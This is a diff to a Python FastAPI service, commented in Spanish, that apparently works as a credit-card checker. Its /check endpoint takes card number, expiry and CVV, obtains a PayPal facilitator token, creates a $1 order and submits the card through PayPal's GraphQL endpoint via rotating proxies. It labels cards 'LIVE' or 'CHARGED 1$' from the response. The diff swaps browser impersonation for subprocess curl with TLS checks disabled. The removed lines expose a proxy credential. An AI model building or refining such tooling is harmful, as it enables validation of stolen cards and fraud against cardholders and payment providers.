@@ -3,18 +3,19 @@ import random
 import string
 import uvicorn
 import os
+import subprocess
+import json
 from fastapi import FastAPI
 from colorama import Fore, init
 from html import unescape
 from dotenv import load_dotenv
-from curl_cffi import requests
 
 load_dotenv()
 
 init(autoreset=True)
 app = FastAPI()
 
-PAYPAL_PROXY_URL = os.getenv("PAYPAL_PROXY_URL", "http://qaxtdvtr-US-rotate:cpyp473gyvje@p.webshare.io:80")
+PAYPAL_PROXY_URL = os.getenv("PAYPAL_PROXY_URL")
 PAYPAL_CLIENT_ID = os.getenv("PAYPAL_CLIENT_ID", "Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh")
 
 def get_session_id():
@@ -28,6 +29,29 @@ def capture(string, start, end):
         e = string.find(end, s)
         return string[s:e]
     except: return None
+
+def curl_request(method, url, headers=None, data=None, proxy=None):
+    """Realiza request usando curl via subprocess"""
+    cmd = ["curl", "-s", "-X", method, url]
+
+    if proxy:
+        cmd.extend(["-x", proxy])
+
+    if headers:
+        for key, val in headers.items():
+            cmd.extend(["-H", f"{key}: {val}"])
+
+    if data:
+        cmd.extend(["-d", json.dumps(data), "-H", "Content-Type: application/json"])
+
+    cmd.append("--insecure")
+
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=40)
+        return result.stdout
+    except Exception as e:
+        print(f"{Fore.RED}Curl Error: {str(e)}")
+        raise
 
 @app.get("/check")
 async def check_card(cc: str, mm: str, aa: str, cvv: str):
@@ -47,8 +71,8 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
     try:
         # PASO 1: Obtener Token Facilitador
         url_sdk = f"https://www.paypal.com/smart/buttons?style.label=donate&sdkVersion=5.0.390&clientID={PAYPAL_CLIENT_ID}&env=production&currency=USD&intent=capture"
-        r = requests.get(url_sdk, headers=head_base, proxy=proxy_url, timeout=30, impersonate="chrome120")
-        token = capture(r.text, '"facilitatorAccessToken":"', '"')
+        r = curl_request("GET", url_sdk, headers=head_base, proxy=proxy_url)
+        token = capture(r, '"facilitatorAccessToken":"', '"')
 
         if not token:
             print(f"{Fore.RED}❌ Proxy Error o IP Bloqueada (No Token)")
@@ -59,8 +83,8 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
         # PASO 2: Crear Orden
         head2 = {**head_base, "Authorization": f"Bearer {token}", "Content-Type": "application/json"}
         post2 = {"purchase_units": [{"amount": {"currency_code": "USD", "value": "1"}}], "intent": "CAPTURE"}
-        r2 = requests.post("https://www.paypal.com/v2/checkout/orders", headers=head2, json=post2, proxy=proxy_url, timeout=30, impersonate="chrome120")
-        order_id = capture(r2.text, '"id":"', '"')
+        r2 = curl_request("POST", "https://www.paypal.com/v2/checkout/orders", headers=head2, data=post2, proxy=proxy_url)
+        order_id = capture(r2, '"id":"', '"')
 
         if not order_id:
             print(f"{Fore.RED}❌ Falló creación de Orden")
@@ -104,19 +128,19 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
             }
         }
 
-        r3 = requests.post("https://www.paypal.com/graphql", headers=head3, json=graphql_payload, proxy=proxy_url, timeout=30, impersonate="chrome120")
-        res_text = r3.text
+        r3 = curl_request("POST", "https://www.paypal.com/graphql", headers=head3, data=graphql_payload, proxy=proxy_url)
+        res_text = r3
 
         err_code = capture(res_text, '"code":"', '"')
         print(f"{Fore.MAGENTA}--- RESPUESTA PAYPAL ---")
         print(res_text[:500] + "...")
         print(f"{Fore.MAGENTA}------------------------")
 
-        if "is3DSecureRequired" in err_code or "APPROVE_GUEST_PAYMENT_COMPLETED" in res_text:
+        if "is3DSecureRequired" in str(err_code) or "APPROVE_GUEST_PAYMENT_COMPLETED" in res_text:
             print(f"{Fore.GREEN}✅ LIVE: {cc}")
             return {"status": "approved", "msg": "CHARGED 1$ ✅"}
 
-        elif "is3DSecureRequired" in err_code or "INVALID_SECURITY_CODE" in res_text:
+        elif "INVALID_SECURITY_CODE" in res_text:
             print(f"{Fore.GREEN}✅ LIVE: {cc}")
             return {"status": "approved", "msg": "INVALID SECURITY CODE ✅"}
 
